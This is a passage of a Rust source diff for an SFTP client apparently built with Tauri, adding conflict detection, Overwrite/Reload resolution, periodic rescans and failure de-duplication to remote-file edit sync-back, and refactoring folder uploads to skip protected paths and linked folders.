+            WatchVerdict::Rescan => self.on_change().await,
+            WatchVerdict::Unrelated => {}
+        }
+    }
+
+    /// A change to the staged file was seen (or a rescan asked for a look):
+    /// once the burst settles, sync it once and report the outcome (success
+    /// AND failure). Nothing is sent when the file holds what the server
+    /// already has (an unchanged save, the rewrite a Reload makes, a rescan
+    /// with nothing new). Nothing is sent over a remote change made since the
+    /// session last agreed with the server, or over a file deleted there: that
+    /// is held back as a conflict for the user to settle
+    /// ([`sftp_edit_resolve`]) - and a check that fails is an error, never a
+    /// blind upload.
+    ///
+    /// Accepted race: the remote file is checked and THEN uploaded, so a
+    /// change that lands in the one round trip between the two is
+    /// overwritten (SFTP v3 has no conditional write).
+    ///
+    /// A sync that fails is reported once. A rescan (the periodic check, or
+    /// a watcher overflow) tries only content that has been neither synced
+    /// nor tried: it used to retry a failing save every half minute, with an
+    /// error event each time - and, when the swap was refused, another full
+    /// temporary copy on the server each time. A save the watcher saw always
+    /// gets its attempt (and its event).
     async fn on_change(self: Arc<Self>) {
         let Some(generation) = self.debounce.settle().await else {
             return; // a newer change will upload
         };
-        if self.stopped.load(Ordering::SeqCst) {
+        if self.is_stopped() {
             return;
         }
         let _turn = self.upload_lock.lock().await;
         // The previous upload may have been running while newer saves queued
         // up behind it; only the newest still has work to do.
-        if !self.debounce.is_current(generation) || self.stopped.load(Ordering::SeqCst) {
+        if !self.debounce.is_current(generation) || self.is_stopped() {
             return;
         }
-        let result = upload_edited_file(&self.sftp, &self.local, &self.target, self.mode).await;
-        match &result {
-            Ok(bytes) => log::info!(
-                "[sshspan-sftp] synced back {} ({bytes} bytes) on {}",
-                self.remote,
-                self.session_id
-            ),
-            Err(e) => log::warn!(
-                "[sshspan-sftp] sync of {} on {} failed: {e}",
-                self.remote,
-                self.session_id
-            ),
+        let Some(_open) = self.staged.open_handle() else {
+            return;
+        };
+        let saved = self.retry.save_seen.swap(false, Ordering::SeqCst);
+        let local_hash = match sha256_file(self.staged.path()).await {
+            Ok(hash) => hash,
+            Err(e) => {
+                let why = format!("could not read the saved file: {e}");
+                return self.failed(saved, None, why);
+            }
+        };
+        if self.synced.lock().unwrap().as_deref() == Some(local_hash.as_str()) {
+            return;
         }
-        (self.emit)(edit_sync_event(&self.session_id, &self.remote, &result));
+        if !saved && self.already_failed(&local_hash) {
+            return;
+        }
+        match self.check_remote().await {
+            Check::Agrees => {}
+            Check::Failed(why) => return self.failed(saved, Some(local_hash), why),
+            Check::Differs(differs) => {
+                log::info!(
+                    "[sshspan-sftp] {} {} on the server since it was opened on {}; not syncing",
+                    self.remote,
+                    differs.reason.as_str(),
+                    self.session_id
+                );
+                if let Some(conflict) = self.hold_back(differs, &local_hash) {
+                    self.report(&SyncOutcome::Conflict {
+                        name: self.display_name().to_string(),
+                        conflict,
+                    });
+                }
+                return;
+            }
+        }
+        match self.upload(local_hash.clone()).await {
+            Ok(()) => self.report(&SyncOutcome::Uploaded),
+            Err(e) => self.failed(saved, Some(local_hash), e),
+        }
+    }
+
+    /// Whether `local_hash` is the content of the last failed attempt.
+    fn already_failed(&self, local_hash: &str) -> bool {
+        self.retry
+            .failure
+            .lock()
+            .unwrap()
+            .as_ref()
+            .is_some_and(|f| f.local.as_deref() == Some(local_hash))
+    }
+
+    /// A sync-back that did not go through: remembered, and reported -
+    /// unless a rescan met exactly the failure already reported. A save the
+    /// watcher saw (`saved`) always reports.
+    fn failed(&self, saved: bool, local: Option<String>, error: String) {
+        let failure = FailedSync { local, error };
+        let repeat = {
+            let mut last = self.retry.failure.lock().unwrap();
+            let repeat = last.as_ref() == Some(&failure);
+            *last = Some(failure.clone());
+            repeat
+        };
+        if saved || !repeat {
+            self.report(&SyncOutcome::Failed(failure.error));
+        }
+    }
+
+    /// The remote file as it is now.
+    async fn remote_now(&self) -> RemoteNow {
+        use russh_sftp::protocol::StatusCode;
+        match self.sftp.metadata(&self.target).await {
+            Ok(md) => RemoteNow::Present(RemoteStamp::of(&md)),
+            Err(e) if sftp_status(&e, &[StatusCode::NoSuchFile]) => RemoteNow::Deleted,
+            Err(e) => RemoteNow::Failed(sftp_error_detail(e)),
+        }
+    }
+
+    /// How the remote file compares with what the session last agreed with.
+    /// A server that reports neither size nor time is compared by content
+    /// (SHA-256, up to [`EDIT_COMPARE_MAX_BYTES`]; a larger file cannot be
+    /// compared and is a conflict the user settles).
+    async fn check_remote(&self) -> Check {
+        let name = self.display_name();
+        let now = match self.remote_now().await {
+            RemoteNow::Present(now) => now,
+            RemoteNow::Deleted => {
+                return Check::Differs(Differs {
+                    reason: ConflictReason::Deleted,
+                    remote: RemoteStamp::default(),
+                    remote_sha256: None,
+                })
+            }
+            RemoteNow::Failed(why) => {
+                return Check::Failed(format!(
+                    "Could not check {name} on the server before syncing ({why}), so your save \
+                     was not uploaded. Save again to retry."
+                ))
+            }
+        };
+        if now.size.is_some() || now.mtime.is_some() {
+            return if now == *self.baseline.lock().unwrap() {
+                Check::Agrees
+            } else {
+                Check::Differs(Differs {
+                    reason: ConflictReason::Changed,
+                    remote: now,
+                    remote_sha256: None,
+                })
+            };
+        }
+        let synced = self.synced.lock().unwrap().clone();
+        match remote_sha256_capped(&self.sftp, &self.target, EDIT_COMPARE_MAX_BYTES).await {
+            Ok(Some(hash)) if synced.as_deref() == Some(hash.as_str()) => Check::Agrees,
+            Ok(hash) => Check::Differs(Differs {
+                reason: if hash.is_some() && synced.is_some() {
+                    ConflictReason::Changed
+                } else {
+                    ConflictReason::Unverifiable
+                },
+                remote: now,
+                remote_sha256: hash,
+            }),
+            Err(why) => Check::Failed(format!(
+                "Could not compare {name} with the server before syncing ({why}), so your save \
+                 was not uploaded. Save again to retry."
+            )),
+        }
+    }
+
+    /// Whether the remote file changed again since `pending` was reported -
+    /// neither as reported nor back to what the session last agreed with -
+    /// and how (the fresh conflict). Compared by size and time, or by content
+    /// on a server that reports neither (the re-check used to compare the
+    /// empty size and time, so an Overwrite went over a second change).
+    async fn changed_since(&self, pending: &PendingConflict) -> Result<Option<Differs>, String> {
+        let baseline = *self.baseline.lock().unwrap();
+        let changed = |reason, remote, remote_sha256| {
+            Some(Differs {
+                reason,
+                remote,
+                remote_sha256,
+            })
+        };
+        Ok(match self.remote_now().await {
+            RemoteNow::Failed(why) => return Err(why),
+            RemoteNow::Deleted if pending.reason == ConflictReason::Deleted => None,
+            RemoteNow::Deleted => changed(ConflictReason::Deleted, RemoteStamp::default(), None),
+            RemoteNow::Present(now) if pending.reason == ConflictReason::Deleted => {
+                changed(ConflictReason::Changed, now, None)
+            }
+            RemoteNow::Present(now) if now.size.is_none() && now.mtime.is_none() => {
+                let hash =
+                    remote_sha256_capped(&self.sftp, &self.target, EDIT_COMPARE_MAX_BYTES).await?;
+                let synced = self.synced.lock().unwrap().clone();
+                if hash == pending.remote_sha256 || (hash.is_some() && hash == synced) {
+                    None
+                } else if hash.is_some() {
+                    changed(ConflictReason::Changed, now, hash)
+                } else {
+                    changed(ConflictReason::Unverifiable, now, None)
+                }
+            }
+            RemoteNow::Present(now) if now == pending.remote || now == baseline => None,
+            RemoteNow::Present(now) => changed(ConflictReason::Changed, now, None),
+        })
+    }
+
+    /// Record a conflict as the pending one - keeping its id while the remote
+    /// file stays as reported - and return it for an event; `None` when
+    /// exactly this was already reported for this local content (a periodic
+    /// rescan must not repeat the same message every half minute).
+    fn hold_back(&self, differs: Differs, local_hash: &str) -> Option<PendingConflict> {
+        let mut pending = self.pending.lock().unwrap();
+        if let Some(p) = pending.as_mut() {
+            if p.reason == differs.reason
+                && p.remote == differs.remote
+                && p.remote_sha256 == differs.remote_sha256
+            {
+                if p.local == local_hash {
+                    return None;
+                }
+                p.local = local_hash.to_string();
+                return Some(p.clone());
+            }
+        }
+        let conflict = PendingConflict {
+            id: uuid::Uuid::new_v4().to_string(),
+            reason: differs.reason,
+            remote: differs.remote,
+            remote_sha256: differs.remote_sha256,
+            local: local_hash.to_string(),
+        };
+        *pending = Some(conflict.clone());
+        Some(conflict)
+    }
+
+    /// Upload the staged copy (whose content hashes to `local_hash`) over the
+    /// remote file; the result becomes what the session agrees with (the new
+    /// file's stamp as seen just before it was renamed into place) and any
+    /// pending conflict or failure is settled. A temporary file an earlier
+    /// failed swap left is removed first, so an edit never leaves more than
+    /// one, and one this attempt leaves is remembered. The caller holds
+    /// `upload_lock` and a handle on the staged copy.
+    async fn upload(&self, local_hash: String) -> Result<(), String> {
+        self.remove_kept_temp().await?;
+        let tmp = edit_temp_name(&self.target);
+        let result = upload_edited_file_as(
+            &self.sftp,
+            self.staged.path(),
+            &self.target,
+            self.mode,
+            &tmp,
+        )
+        .await;
+        match result {
+            Ok(up) => {
+                log::info!(
+                    "[sshspan-sftp] synced back {} ({} bytes) on {}",
+                    self.remote,
+                    up.bytes,
+                    self.session_id
+                );
+                *self.baseline.lock().unwrap() = up.stamp;
+                *self.synced.lock().unwrap() = Some(local_hash);
+                *self.pending.lock().unwrap() = None;
+                *self.retry.failure.lock().unwrap() = None;
+                Ok(())
+            }
+            Err(e) => {
+                log::warn!(
+                    "[sshspan-sftp] sync of {} on {} failed: {e}",
+                    self.remote,
+                    self.session_id
+                );
+                // A failed swap keeps the new content at `tmp` (so does a
+                // cleanup the server refused).
+                if self.sftp.symlink_metadata(&tmp).await.is_ok() {
+                    *self.retry.kept_temp.lock().unwrap() = Some(tmp);
+                }
+                Err(e)
+            }
+        }
+    }
+
+    /// Remove the temporary file a failed swap left, if there is one. If the
+    /// server refuses, nothing is uploaded: that would leave a second one.
+    async fn remove_kept_temp(&self) -> Result<(), String> {
+        use russh_sftp::protocol::StatusCode;
+        let kept = self.retry.kept_temp.lock().unwrap().clone();
+        let Some(tmp) = kept else {
+            return Ok(());
+        };
+        match remove_edit_temp(&self.sftp, &tmp).await {
+            Ok(()) => {}
+            Err(e) if sftp_status(&e, &[StatusCode::NoSuchFile]) => {}
+            Err(e) => {
+                return Err(format!(
+                    "The temporary file the last attempt left, {tmp}, could not be removed ({}), \
+                     so nothing was uploaded - remove it, then save again.",
+                    sftp_error_detail(e)
+                ))
+            }
+        }
+        *self.retry.kept_temp.lock().unwrap() = None;
+        Ok(())
+    }
+
+    /// Carry out what the user chose for the PENDING conflict `conflict_id`:
+    /// upload the local copy over the server's version, or replace the local
+    /// copy with it. Either way the session then agrees with the server again
+    /// and the conflict is settled. A resolve with no conflict pending, or for
+    /// a conflict a newer one replaced, is refused. Overwrite first checks the
+    /// server again: if the file is no longer as the conflict reported it
+    /// (someone saved again meanwhile), nothing is uploaded - a FRESH conflict
+    /// is reported and returned instead. A success is also reported as an
+    /// `sftp-edit-sync` event; a failure only as the error.
+    async fn resolve(
+        self: Arc<Self>,
+        conflict_id: &str,
+        action: EditResolution,
+    ) -> Result<serde_json::Value, String> {
+        use russh_sftp::protocol::StatusCode;
+        let _turn = self.upload_lock.lock().await;
+        if self.is_stopped() {
+            return Err(EDIT_SESSION_ENDED.to_string());
+        }
+        let Some(_open) = self.staged.open_handle() else {
+            return Err(EDIT_SESSION_ENDED.to_string());
+        };
+        let pending = match self.pending.lock().unwrap().clone() {
+            None => return Err("There is no conflict to resolve for this file.".to_string()),
+            Some(p) if p.id != conflict_id => {
+                return Err(
+                    "That conflict was replaced by a newer one - choose again on the \
+                     newest message."
+                        .to_string(),
+                )
+            }
+            Some(p) => p,
+        };
+        let name = self.display_name().to_string();
+        let (action_name, outcome) = match action {
+            EditResolution::Overwrite => {
+                let local_hash = sha256_file(self.staged.path())
+                    .await
+                    .map_err(|e| format!("Could not read your copy of {name}: {e}"))?;
+                let fresh = self.changed_since(&pending).await.map_err(|why| {
+                    format!("Could not check {name} on the server ({why}); nothing was uploaded.")
+                })?;
+                if let Some(differs) = fresh {
+                    let conflict = self
+                        .hold_back(differs, &local_hash)
+                        .unwrap_or_else(|| pending.clone());
+                    let outcome = SyncOutcome::Conflict {
+                        name: name.clone(),
+                        conflict,
+                    };
+                    self.report(&outcome);
+                    return Ok(edit_sync_event(
+                        &self.session_id,
+                        &self.edit_id,
+                        &self.remote,
+                        &outcome,
+                    ));
+                }
+                self.upload(local_hash).await?;
+                ("overwrite", SyncOutcome::Uploaded)
+            }
+            EditResolution::Reload => {
+                if let Err(e) = self.sftp.metadata(&self.target).await {
+                    return Err(if sftp_status(&e, &[StatusCode::NoSuchFile]) {
+                        format!(
+                            "{name} was deleted on the server, so there is nothing to reload - \
+                             choose Overwrite to put your copy back."
+                        )
+                    } else {
+                        format!(
+                            "Could not read {name} on the server: {}",
+                            sftp_error_detail(e)
+                        )
+                    });
+                }
+                let local = self.staged.path().display().to_string();
+                let downloaded = download_to_hashed(&self.sftp, &self.target, &local)
+                    .await
+                    .map_err(|e| e.0)?;
+                #[cfg(test)]
+                tests::run_reload_hook(&self.edit_id);
+                // The STAT the download was based on (taken before its first
+                // read) and the hash of the bytes it WROTE - not of the file
+                // as it is now: an editor save landing right after the rename
+                // must still count as a change to upload.
+                *self.baseline.lock().unwrap() = downloaded.stamp;
+                *self.synced.lock().unwrap() = Some(downloaded.sha256);
+                *self.pending.lock().unwrap() = None;
+                *self.retry.failure.lock().unwrap() = None;
+                ("reload", SyncOutcome::Reloaded)
+            }
+        };
+        self.report(&outcome);
+        let stamp = *self.baseline.lock().unwrap();
+        Ok(serde_json::json!({
+            "ok": true,
+            "editId": self.edit_id,
+            "action": action_name,
+            "remoteSize": stamp.size,
+            "remoteModifiedMs": stamp.mtime.map(|s| i64::from(s) * 1000),
+        }))
     }
 }
 
 /// Download a remote file to a temp location, start watching it, and hand the
-/// path back. The renderer opens it with the system default app (opener); on
-/// every local save the watcher re-uploads to the remote path and reports the
-/// outcome with an `sftp-edit-sync` event `{sessionId, remote, ok, error?}`
+/// path back with the session's `editId`. The renderer opens it with the
+/// system default app (opener); on every local save the watcher syncs it back
+/// to the remote path and reports the outcome with an `sftp-edit-sync` event
 /// (success AND failure - a failed sync used to be swallowed, leaving the
 /// editor showing a saved file whose upload never landed).
 ///
-/// Not done, deliberately: a conflict check against a remote change made since
-/// the download. It would need a prompt (or a force option) the renderer does
-/// not have; the upload replaces the remote file with the saved copy.
+/// A save does not overwrite a remote change made since the download (or the
+/// last sync-back): the remote file's size and modification time are compared
+/// first, and a difference - or the file deleted on the server - is reported
+/// as a conflict (`conflict: true`, with a `conflictId`) for the user to
+/// settle with [`sftp_edit_resolve`] - Overwrite or Reload. The check and the
+/// upload are two steps: a change landing in the one round trip between them
+/// is overwritten (accepted - SFTP v3 has no conditional write).
+///
+/// Opening a file that is already open for editing in this session returns
+/// that edit (same `editId` and local copy, `reused: true`) instead of
+/// starting a second one.
 #[tauri::command]
 pub async fn sftp_open_for_edit(
     app: AppHandle,
@@ -1165,62 +2611,135 @@ pub async fn sftp_open_for_edit(
 ) -> CmdResult<serde_json::Value> {
     use tauri::Emitter;
     let sftp = sftp_from_session(&app, &session_id)?;
+    let app_for_events = app.clone();
+    let emit: Arc<dyn Fn(serde_json::Value) + Send + Sync> = Arc::new(move |payload| {
+        let _ = app_for_events.emit("sftp-edit-sync", payload);
+    });
+    open_for_edit_in(
+        &app.state::<EditRegistry>(),
+        sftp,
+        session_id,
+        remote,
+        edit_temp_dir(),
+        emit,
+    )
+    .await
+}
+
+/// [`sftp_open_for_edit`] without the `AppHandle`: the registry, the
+/// session's SFTP channel, the folder to stage in and where events go.
+async fn open_for_edit_in(
+    edit_registry: &EditRegistry,
+    sftp: Arc<russh_sftp::client::SftpSession>,
+    session_id: String,
+    remote: String,
+    temp_dir: PathBuf,
+    emit: Arc<dyn Fn(serde_json::Value) + Send + Sync>,
+) -> CmdResult<serde_json::Value> {
     let file_name = remote.rsplit('/').next().unwrap_or("file").to_string();
     if file_name.is_empty() {
         return Err(CmdError("Cannot edit a directory path.".into()));
     }
+    let key = format!("{session_id}:{remote}");
+    if let Some(open) = edit_registry
+        .live_for_key(&key)
+        .filter(|open| edit_is_usable(open))
+    {
+        return Ok(reused_edit(&open, &remote));
+    }
     // Best-effort prune of staged copies left behind by crashed/killed
     // sessions (only files directly inside sshspan-edit, older than a day).
-    let temp_dir = edit_temp_dir();
     crate::sftp::prune_stale_stage_files(&temp_dir, STAGE_FILE_MAX_AGE);
     // Unpredictable staged name: the file can hold secret remote contents,
     // so its path must not be guessable by other local users (the dir is
     // 0700, this is defense in depth for the pre-existing-dir case).
-    let local = temp_dir.join(format!(
-        "{}-{}",
-        &session_id[..8.min(session_id.len())],
-        staged_file_name(&file_name)
-    ));
+    let local = edit_stage_path(
+        &temp_dir,
+        &session_id,
+        &file_name,
+        &SensitiveLocations::current(),
+    )
+    .map_err(CmdError)?;
 
-    // What the upload has to preserve and where it really lands: the mode
-    // bits (a rename gives the new file a fresh inode) and the path with
-    // symlinks resolved (so editing through a link updates its target).
-    let mode = sftp
-        .metadata(&remote)
+    let StagedEdit {
+        baseline,
+        mode,
+        target,
+        synced,
+    } = stage_for_edit(&sftp, &remote, &local)
         .await
-        .ok()
-        .and_then(|md| md.permissions)
-        .map(|m| m & 0o7777);
-    let target = sftp
-        .canonicalize(&remote)
-        .await
-        .unwrap_or_else(|_| remote.clone());
-
-    download_to(&sftp, &remote, &local.display().to_string()).await?;
+        .map_err(CmdError)?;
     let local_str = local.display().to_string();
 
-    let key = format!("{session_id}:{remote}");
-    let edit_registry = app.state::<EditRegistry>();
-    // Stop any previous watch on the same file.
-    edit_registry.stop(&key);
-
-    let stopped = Arc::new(std::sync::atomic::AtomicBool::new(false));
-    let app_for_events = app.clone();
+    let edit_id = uuid::Uuid::new_v4().to_string();
     let sync = Arc::new(EditSync {
         sftp: sftp.clone(),
         session_id: session_id.clone(),
+        edit_id: edit_id.clone(),
         remote: remote.clone(),
         target,
-        local: local.clone(),
+        staged: crate::sftp::StagedCopy::new(local.clone()),
         mode,
-        emit: Arc::new(move |payload| {
-            let _ = app_for_events.emit("sftp-edit-sync", payload);
-        }),
-        stopped: stopped.clone(),
+        emit,
+        stopped: std::sync::atomic::AtomicBool::new(false),
         debounce: EditDebounce::new(EDIT_DEBOUNCE),
         upload_lock: tokio::sync::Mutex::new(()),
+        baseline: std::sync::Mutex::new(baseline),
+        synced: std::sync::Mutex::new(synced),
+        pending: std::sync::Mutex::new(None),
+        retry: SyncRetry::default(),
     });
+    let watcher = match edit_watcher(&sync, &local) {
+        Ok(watcher) => watcher,
+        Err(e) => {
+            sync.end();
+            return Err(e);
+        }
+    };
 
+    // Two opens of one file can race through the download: the first to get
+    // here keeps its session and the other caller gets that one (its own
+    // copy is deleted). The second used to end the first after its caller
+    // had handed the first copy to an editor - whose saves then went nowhere.
+    // An earlier edit that is no longer usable (its copy is gone) is ended.
+    let watch = EditWatch {
+        session_id,
+        watcher: Some(watcher),
+        sync: sync.clone(),
+    };
+    if let Err(open) = edit_registry.insert_unless_live(key, watch, edit_is_usable) {
+        return Ok(reused_edit(&open, &remote));
+    }
+    tauri::async_runtime::spawn(periodic_rescan(Arc::downgrade(&sync), EDIT_RESCAN_EVERY));
+
+    Ok(serde_json::json!({
+        "ok": true, "localPath": local_str, "remote": remote, "editId": edit_id,
+    }))
+}
+
+/// Whether an open edit can be handed to another open of the same file: not
+/// ended, and its staged copy still there.
+fn edit_is_usable(open: &EditSync) -> bool {
+    !open.is_stopped() && open.staged.path().exists()
+}
+
+/// The `sftp_open_for_edit` result for an edit that was already open.
+fn reused_edit(open: &EditSync, remote: &str) -> serde_json::Value {
+    serde_json::json!({
+        "ok": true,
+        "localPath": open.staged.path().display().to_string(),
+        "remote": remote,
+        "editId": open.edit_id,
+        "reused": true,
+    })
+}
+
+/// The file watcher of an edit: a save of the staged copy (or a rescan the
+/// watcher asks for) reaches `sync`.
+fn edit_watcher(
+    sync: &Arc<EditSync>,
+    local: &std::path::Path,
+) -> CmdResult<notify::RecommendedWatcher> {
     let staged_name = local
         .file_name()
         .map(|n| n.to_os_string())
@@ -1228,12 +2747,12 @@ pub async fn sftp_open_for_edit(
     let sync_for_watch = sync.clone();
     let mut watcher =
         notify::recommended_watcher(move |res: Result<notify::Event, notify::Error>| {
-            if sync_for_watch.stopped.load(Ordering::SeqCst) {
+            if sync_for_watch.is_stopped() {
                 return;
             }
-            match watch_verdict(res, &staged_name) {
-                Ok(true) => {}
-                Ok(false) => return,
+            let verdict = match watch_verdict(res, &staged_name) {
+                Ok(WatchVerdict::Unrelated) => return,
+                Ok(verdict) => verdict,
                 Err(e) => {
                     // Not a save, but not to be hidden either: a watcher that
                     // has died would otherwise look like "no saves happened".
@@ -1244,16 +2763,15 @@ pub async fn sftp_open_for_edit(
                     );
                     return;
                 }
-            }
+            };
             // The staged file deliberately stays for the life of the edit
-            // session: the watcher only uploads-on-change, it never
-            // re-downloads, and deleting a path a third-party editor may hold
-            // open makes editors recreate an empty/stale buffer on the next
-            // save - clobbering the remote file. Cleanup happens on session
-            // close, vault lock/teardown (EditRegistry::stop*), explicit
+            // session: deleting a path a third-party editor may hold open
+            // makes editors recreate an empty/stale buffer on the next save -
+            // clobbering the remote file. Cleanup happens on session close,
+            // vault lock/teardown (EditRegistry::stop*), explicit
             // sftp_close_edit, or the 24h stale prune.
             let sync = sync_for_watch.clone();
-            tauri::async_runtime::spawn(sync.on_change());
+            tauri::async_runtime::spawn(sync.react(verdict));
         })
         .map_err(|e| CmdError(e.to_string()))?;
 
@@ -1265,23 +2783,100 @@ pub async fn sftp_open_for_edit(
     watcher
         .watch(watch_dir, notify::RecursiveMode::NonRecursive)
         .map_err(|e| CmdError(e.to_string()))?;
-
-    edit_registry.insert(
-        key,
-        EditWatch {
-            session_id,
-            remote_path: remote.clone(),
-            local_path: local_str.clone(),
-            sftp: sftp.clone(),
-            watcher: Some(watcher),
-            stopped,
-        },
-    );
-
-    Ok(serde_json::json!({ "ok": true, "localPath": local_str, "remote": remote }))
+    Ok(watcher)
 }
 
-/// Stop the edit watch for a (session, remote path) pair and clean the temp file.
+/// Settle a conflict an `sftp-edit-sync` event reported (`conflict: true`):
+/// `action` "overwrite" uploads the local copy over the server's version,
+/// "reload" replaces the local copy with the server's version. Either way the
+/// session then agrees with the server again (a new baseline). `conflict_id`
+/// is the event's `conflictId`: only the newest pending conflict of the
+/// session can be settled, and when the server changed again since that
+/// event, nothing is uploaded and the result is a fresh conflict event (see
+/// [`EditSync::resolve`]).
+#[tauri::command]
+pub async fn sftp_edit_resolve(
+    app: AppHandle,
+    edit_id: String,
+    conflict_id: String,
+    action: String,
+) -> CmdResult<serde_json::Value> {
+    require_unlocked(&app)?;
+    let action = EditResolution::parse(&action).map_err(CmdError)?;
+    let sync = app
+        .state::<EditRegistry>()
+        .find(&edit_id)
+        .ok_or_else(|| CmdError(EDIT_SESSION_ENDED.into()))?;
+    sync.resolve(&conflict_id, action).await.map_err(CmdError)
+}
+
+/// What opening a remote file for editing staged locally.
+struct StagedEdit {
+    /// The remote file as of the download: what later saves are compared with.
+    baseline: RemoteStamp,
+    /// Its permission bits, put back on the file a save replaces.
+    mode: Option<u32>,
+    /// The path a save writes: `remote` with symbolic links resolved.
+    target: String,
+    /// SHA-256 of what was downloaded (the content the server holds).
+    synced: Option<String>,
+}
+
+/// Download `remote` into `local` for editing and record what the session
+/// needs to know about it. Everything comes from the download itself: the
+/// mode bits a save must put back (a rename gives the new file a fresh
+/// inode), the baseline a save is compared with (the STAT the download was
+/// based on, taken BEFORE its first read - it used to be a separate STAT
+/// whose failure was swallowed, leaving no baseline), and the SHA-256 of the
+/// bytes it wrote. The path a save writes is `remote` with symbolic links
+/// resolved, so editing through a link updates the file it points at.
+async fn stage_for_edit(
+    sftp: &russh_sftp::client::SftpSession,
+    remote: &str,
+    local: &std::path::Path,
+) -> Result<StagedEdit, String> {
+    let target = sftp
+        .canonicalize(remote)
+        .await
+        .unwrap_or_else(|_| remote.to_string());
+    let downloaded = download_to_hashed(sftp, remote, &local.display().to_string())
+        .await
+        .map_err(|e| e.0)?;
+    Ok(StagedEdit {
+        baseline: downloaded.stamp,
+        mode: downloaded.mode,
+        target,
+        synced: Some(downloaded.sha256),
+    })
+}
+
+/// How often an open edit looks at its staged copy again on its own.
+const EDIT_RESCAN_EVERY: std::time::Duration = std::time::Duration::from_secs(30);
+
+/// Look at the staged copy again every `every` while the edit is open, as if
+/// the watcher had asked for a rescan: the copy is hashed and compared with
+/// what the server holds (cheap - nothing is sent when nothing changed). This
+/// is what catches a save whose watcher events were lost on Windows, where
+/// notify's backend reports no overflow (on Linux and macOS the overflow
+/// itself triggers the same rescan). A rescan tries only content that has
+/// been neither synced nor tried (see [`EditSync::on_change`]). Ends with the
+/// edit - and holds it only weakly between looks, so an ended edit does not
+/// keep its SFTP session alive until the next one.
+async fn periodic_rescan(sync: std::sync::Weak<EditSync>, every: std::time::Duration) {
+    loop {
+        tokio::time::sleep(every).await;
+        let Some(sync) = sync.upgrade() else {
+            return;
+        };
+        if sync.is_stopped() {
+            return;
+        }
+        sync.react(WatchVerdict::Rescan).await;
+    }
+}
+
+/// Stop the edit watch for a (session, remote path) pair and discard the
+/// staged copy.
 #[tauri::command]
 pub fn sftp_close_edit(
     app: AppHandle,
@@ -1289,9 +2884,7 @@ pub fn sftp_close_edit(
     remote: String,
 ) -> CmdResult<serde_json::Value> {
     let key = format!("{session_id}:{remote}");
-    if let Some(local) = app.state::<EditRegistry>().stop(&key) {
-        let _ = std::fs::remove_file(&local);
-    }
+    app.state::<EditRegistry>().stop(&key);
     Ok(serde_json::json!({ "ok": true }))
 }
 
@@ -1339,104 +2932,162 @@ fn item_resume(item: &serde_json::Value, batch: ResumeMode) -> ResumeMode {
     }
 }
 
-/// Expand a local directory into upload jobs (recursive); a file becomes one.
+/// Expand one picked local path into upload jobs - a file becomes one, a
+/// folder is walked - and say what was left out, and why: the item's
+/// warnings. A pick of which nothing at all can be uploaded (a link to a
+/// folder, a special file, a link to a protected file) is an error, as for a
+/// download; the protected files a folder upload skips are warnings (both
+/// used to be only logged, the pick reported as queued with nothing added).
 ///
-/// Symlink-aware and cycle-breaking: recursion only ever enters REAL
-/// directories. A symlinked directory is never followed (following one can
-/// loop - `ln -s .. up` - and recurse until the stack overflows); a symlinked
-/// FILE is uploaded by following the link exactly one level (File::open
-/// resolves it; there is no recursion, hence no cycle).
+/// Symlink-aware and cycle-breaking: the walk only ever enters REAL folders.
+/// A link to a folder (or a Windows junction) is never followed - following
+/// one can loop (`ln -s .. up`) - and a link to a FILE is uploaded by
+/// following it exactly one level (File::open resolves it; no recursion, no
+/// cycle) once its target passed the read rules.
+///
+/// Cheap per file: the pick itself passed the full read rules (the caller),
+/// every folder below it is a real folder - so its resolved path is its
+/// parent's plus its name - and is checked once, and a file is judged by its
+/// folder's resolved path plus its own name, without touching the disk. Only
+/// a linked file is resolved, because it is followed.
 fn expand_upload(
-    local: PathBuf,
-    remote: String,
-    session_id: String,
-    server_name: String,
-    resume: ResumeMode,
-    preserve_ts: bool,
-    out: &mut Vec<QueuedItem>,
-) {
-    // symlink_metadata (lstat): classifies the entry itself, never follows.
-    let md = match std::fs::symlink_metadata(&local) {
-        Ok(m) => m,
-        Err(_) => return,
+    local: &std::path::Path,
+    remote: &str,
+    ctx: &ItemCtx,
+    sensitive: &SensitiveLocations,
+) -> Result<(Vec<QueuedItem>, Notes), String> {
+    let mut walk = UploadWalk {
+        ctx,
+        sensitive,
+        jobs: Vec::new(),
+        notes: Notes::default(),
     };
-    if md.is_symlink() {
-        match std::fs::metadata(&local) {
-            Ok(target) if target.is_file() => {
-                // The link resolves to a file we follow one level; the TARGET
-                // must still pass the protected-source check, or a symlink to
-                // the vault DB inside an allowed tree would be uploaded (F5).
-                if is_protected_upload_source(&local) {
-                    log::warn!(
-                        "[sshspan-sftp] upload: skipping {} (symlink target is a protected path)",
-                        local.display()
-                    );
-                    return;
-                }
-                out.push(QueuedItem {
-                    kind: JobKind::Upload,
-                    session_id: session_id.clone(),
-                    server_name: server_name.clone(),
-                    local_path: local.display().to_string(),
-                    remote_path: remote,
-                    size: target.len(),
-                    target: None,
-                    resume: Some(resume),
-                    preserve_ts: Some(preserve_ts),
-                });
+    walk.pick(local, remote)?;
+    Ok((walk.jobs, walk.notes))
+}
+
+/// One upload pick being expanded (see [`expand_upload`]).
+struct UploadWalk<'a> {
+    ctx: &'a ItemCtx,
+    sensitive: &'a SensitiveLocations,
+    jobs: Vec<QueuedItem>,
+    notes: Notes,
+}
+
+impl UploadWalk<'_> {
+    /// The picked path itself; `Err` when nothing of it can be uploaded.
+    fn pick(&mut self, local: &std::path::Path, remote: &str) -> Result<(), String> {
+        // symlink_metadata (lstat): classifies the pick itself, never follows.
+        match std::fs::symlink_metadata(local) {
+            Ok(md) if md.is_symlink() => self.follow_link(local, remote),
+            Ok(md) if md.is_dir() => {
+                self.folder(local, remote);
+                Ok(())
             }
-            _ => {
-                log::warn!(
-                    "[sshspan-sftp] upload: skipping symlinked directory {} (symlink cycles are not followed)",
-                    local.display()
-                );
+            // The caller checked the pick with the full read rules.
+            Ok(md) if md.is_file() => {
+                self.jobs.push(self.ctx.upload(local, remote, md.len()));
+                Ok(())
+            }
+            Ok(_) => Err("it is not a regular file or folder".to_string()),
+            Err(e) => Err(format!("it could not be read ({e})")),
+        }
+    }
+
+    /// Walk the real folder `root`. Iterative on purpose: an explicit stack
+    /// has no recursion depth to overflow.
+    fn folder(&mut self, root: &std::path::Path, remote: &str) {
+        let resolved = canonical(root).unwrap_or_else(|_| root.to_path_buf());
+        let mut stack = vec![(root.to_path_buf(), resolved, remote.to_string())];
+        while let Some((dir, dir_resolved, dir_remote)) = stack.pop() {
+            if let Some(why) = self.sensitive.folder_read_refusal(&dir, &dir_resolved) {
+                self.notes.push(format!(
+                    "skipped {} and everything in it: {why}",
+                    dir.display()
+                ));
+                continue;
+            }
